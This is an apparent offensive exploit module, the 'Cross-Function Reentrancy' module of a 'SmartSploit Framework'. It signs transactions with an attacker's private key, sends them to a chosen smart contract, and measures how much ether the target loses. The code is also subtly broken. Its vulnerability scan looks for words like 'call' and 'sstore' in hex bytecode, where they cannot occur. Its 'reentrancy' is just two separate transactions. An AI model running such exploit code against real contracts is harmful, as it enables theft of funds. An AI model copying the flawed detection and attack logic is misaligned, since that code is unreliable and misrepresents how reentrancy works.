"""
Cross-Function Reentrancy Exploit Module
SmartSploit Framework - Reentrancy attack targeting different functions
"""

from smartsploit.lib.base_module import BaseExploit, ExploitResult, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import time
import logging

logger = logging.getLogger(__name__)

class CrossFunctionReentrancyExploit(BaseExploit):
    """Cross-function reentrancy exploit for same contract different functions"""
    
    def __init__(self):
        super().__init__()
        self.name = "Cross-Function Reentrancy"
        self.description = "Exploits reentrancy between different functions in same contract"
        self.author = "SmartSploit Team"
        
        # Set module info
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/",
                "https://github.com/sigp/solidity-security-blog"
            ],
            severity="high",
            targets=["Multi-function contracts", "State sharing functions", "Complex DApps"]
        )
        
        # Module options
        self.options = {
            "TARGET_CONTRACT": {"value": "", "required": True, "description": "Target contract address"},
            "ENTRY_FUNCTION": {"value": "withdraw", "required": True, "description": "Entry function for attack"},
            "TARGET_FUNCTION": {"value": "transfer", "required": True, "description": "Target function to manipulate"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "PRIVATE_KEY": {"value": "", "required": True, "description": "Attacker private key"},
            "GAS_LIMIT": {"value": "500000", "required": False, "description": "Transaction gas limit"},
            "ATTACK_AMOUNT": {"value": "0.1", "required": False, "description": "Attack amount in ETH"},
            "FUNCTION_SELECTOR_1": {"value": "", "required": False, "description": "First function selector"},
            "FUNCTION_SELECTOR_2": {"value": "", "required": False, "description": "Second function selector"}
        }
        
    def check_requirements(self) -> bool:
        """Check if all requirements are met"""
        required_options = ["TARGET_CONTRACT", "RPC_URL", "PRIVATE_KEY"]
        
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
                
        # Validate contract address
        target = self.options["TARGET_CONTRACT"]["value"]
        if not Web3.is_address(target):
            logger.error("Invalid target contract address")
            return False
            
        return True
        
    def analyze_functions(self) -> dict:
        """Analyze target contract functions for cross-function vulnerabilities"""
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            target_addr = self.options["TARGET_CONTRACT"]["value"]
            
            analysis = {
                "contract": target_addr,
                "functions_analyzed": [],
                "vulnerabilities": [],
                "attack_paths": [],
                "risk_level": "unknown"
            }
            
            # Get contract code
            contract_code = w3.eth.get_code(target_addr)
            
            if len(contract_code) <= 2:
                analysis["vulnerabilities"].append("Contract not deployed or no code")
                return analysis
                
            code_str = contract_code.hex()
            
            # Analyze function patterns
            entry_func = self.options["ENTRY_FUNCTION"]["value"]
            target_func = self.options["TARGET_FUNCTION"]["value"]
            
            analysis["functions_analyzed"] = [entry_func, target_func]
            
            # Check for common patterns
            patterns = {
                "external_calls": ["call", "delegatecall", "staticcall"],
                "state_variables": ["sstore", "sload"],
                "balance_checks": ["balance", "selfdestruct"],
                "transfer_functions": ["transfer", "send", "call"]
            }
            
            for pattern_type, pattern_list in patterns.items():
                for pattern in pattern_list:
                    if pattern in code_str.lower():
                        analysis["vulnerabilities"].append(f"{pattern_type}: {pattern} detected")
                        
            # Identify potential attack paths
            if "call" in code_str.lower() and "sstore" in code_str.lower():
                analysis["attack_paths"].append("External call before state update")
                analysis["risk_level"] = "high"
                
            if "transfer" in code_str.lower() and "balance" in code_str.lower():
                analysis["attack_paths"].append("Balance manipulation via function calls")
                analysis["risk_level"] = "medium"
                
            if "delegatecall" in code_str.lower():
                analysis["attack_paths"].append("Delegatecall context manipulation")
                analysis["risk_level"] = "critical"
                
            return analysis
            
        except Exception as e:
            logger.error(f"Function analysis failed: {e}")
            return {"error": str(e)}
            
    def create_attack_payload(self) -> bytes:
        """Create attack payload for cross-function reentrancy"""
        try:
            # Basic attack payload that calls back into different function
            entry_func = self.options["ENTRY_FUNCTION"]["value"]
            target_func = self.options["TARGET_FUNCTION"]["value"]
            
            # Use provided selectors or generate basic ones
            selector1 = self.options["FUNCTION_SELECTOR_1"]["value"]
            selector2 = self.options["FUNCTION_SELECTOR_2"]["value"]
            
            if not selector1:
                # Generate selector for common withdraw function
                selector1 = Web3.keccak(text=f"{entry_func}(uint256)")[:4].hex()
                
            if not selector2:
                # Generate selector for common transfer function  
                selector2 = Web3.keccak(text=f"{target_func}(address,uint256)")[:4].hex()
                
            # Create payload that combines both function calls
            payload = selector1 + "0" * 56  # First function call
            payload += selector2 + "0" * 56  # Second function call
            
            logger.info(f"Created attack payload: {payload}")
            return bytes.fromhex(payload.replace('0x', ''))
            
        except Exception as e:
            logger.error(f"Payload creation failed: {e}")
            return b""
            
    def execute_cross_function_attack(self) -> dict:
        """Execute cross-function reentrancy attack"""
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            target_addr = self.options["TARGET_CONTRACT"]["value"]
            
            account = w3.eth.account.from_key(self.options["PRIVATE_KEY"]["value"])
            attack_amount = Web3.to_wei(float(self.options["ATTACK_AMOUNT"]["value"]), 'ether')
            
            # Get initial states
            initial_balance = w3.eth.get_balance(account.address)
            initial_target_balance = w3.eth.get_balance(target_addr)
            
            logger.info(f"Starting cross-function reentrancy attack...")
            logger.info(f"Target: {target_addr}")
            logger.info(f"Entry function: {self.options['ENTRY_FUNCTION']['value']}")
            logger.info(f"Target function: {self.options['TARGET_FUNCTION']['value']}")
            
            # Create attack payload
            payload = self.create_attack_payload()
            
            # Execute attack sequence
            attacks_executed = []
            
            # Attack 1: Call entry function
            entry_txn = {
                'to': target_addr,
                'value': attack_amount,
                'gas': int(self.options["GAS_LIMIT"]["value"]) // 2,
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(account.address),
                'data': payload[:68]  # First part of payload
            }
            
            signed_txn1 = w3.eth.account.sign_transaction(entry_txn, self.options["PRIVATE_KEY"]["value"])
            tx_hash1 = w3.eth.send_raw_transaction(signed_txn1.rawTransaction)
            
            logger.info(f"Entry function attack sent: {tx_hash1.hex()}")
            receipt1 = w3.eth.wait_for_transaction_receipt(tx_hash1)
            attacks_executed.append({"hash": tx_hash1.hex(), "status": receipt1.status})
            
            # Small delay
            time.sleep(2)
            
            # Attack 2: Call target function while state is inconsistent
            target_txn = {
                'to': target_addr,
                'value': 0,
                'gas': int(self.options["GAS_LIMIT"]["value"]) // 2,
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(account.address),
                'data': payload[68:] if len(payload) > 68 else payload  # Second part of payload
            }
            
            signed_txn2 = w3.eth.account.sign_transaction(target_txn, self.options["PRIVATE_KEY"]["value"])
            tx_hash2 = w3.eth.send_raw_transaction(signed_txn2.rawTransaction)
            
            logger.info(f"Target function attack sent: {tx_hash2.hex()}")
            receipt2 = w3.eth.wait_for_transaction_receipt(tx_hash2)
            attacks_executed.append({"hash": tx_hash2.hex(), "status": receipt2.status})
            
            # Calculate final results
            final_balance = w3.eth.get_balance(account.address)
            final_target_balance = w3.eth.get_balance(target_addr)
            
            balance_change = final_balance - initial_balance
            target_loss = initial_target_balance - final_target_balance
            
            success = any(attack["status"] == 1 for attack in attacks_executed)
            
            result = {
                "result": ExploitResult.SUCCESS if success else ExploitResult.ERROR,
                "attacks_executed": attacks_executed,
                "total_gas_used": receipt1.gasUsed + receipt2.gasUsed,
                "balance_change": Web3.from_wei(balance_change, 'ether'),
                "target_loss": Web3.from_wei(target_loss, 'ether'),
                "attack_successful": success,
                "exploitation_method": "cross-function-reentrancy"
            }
            
            if success:
                logger.info(f"Cross-function reentrancy successful!")
                logger.info(f"Balance change: {result['balance_change']} ETH")
            else:
                logger.warning("Cross-function reentrancy failed")
                
            return result
            
        except Exception as e:
            logger.error(f"Cross-function attack failed: {e}")
            return {"result": ExploitResult.ERROR, "message": str(e)}
            
    def run(self) -> dict:
        """Main exploit execution"""
        if not self.check_requirements():
            return {"result": ExploitResult.ERROR, "message": "Requirements check failed"}
            
        logger.info("Running Cross-Function Reentrancy Exploit")
        
        # Analyze target functions
        analysis = self.analyze_functions()
        if "error" in analysis:
            return {"result": ExploitResult.ERROR, "message": f"Function analysis failed: {analysis['error']}"}
            
        # Execute attack
        result = self.execute_cross_function_attack()
        result["function_analysis"] = analysis
        
        return result